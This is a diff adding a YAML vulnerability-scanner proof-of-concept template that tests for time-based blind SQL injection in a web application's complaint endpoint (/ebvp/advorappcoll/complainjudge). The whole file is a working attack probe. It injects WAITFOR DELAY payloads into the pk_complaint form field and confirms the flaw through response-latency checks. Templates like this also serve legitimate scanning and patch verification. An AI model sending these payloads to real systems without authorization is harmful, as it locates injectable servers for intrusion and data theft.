@@ -1,0 +1,41 @@
+name: poc-yaml-test-sqli
+manual: true
+transport: http
+set:
+  sleepSecond1: randomInt(6, 8)
+  sleepSecond2: randomInt(3, 5)
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /ebvp/advorappcoll/complainjudge
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:0%27--"
+    expression: size(response.body_string) > 0
+    output:
+      r0latency: response.latency
+  r1:
+    request:
+      cache: true
+      method: POST
+      path: /ebvp/advorappcoll/complainjudge
+      read_timeout: "10"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--"
+    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 
+  r2:
+    request:
+      cache: true
+      method: POST
+      path: /ebvp/advorappcoll/complainjudge
+      read_timeout: "10"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{sleepSecond2}}%27--"
+    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 
+expression: r0() && r1() && r2()
+detail:
+  author: k3ppf0r
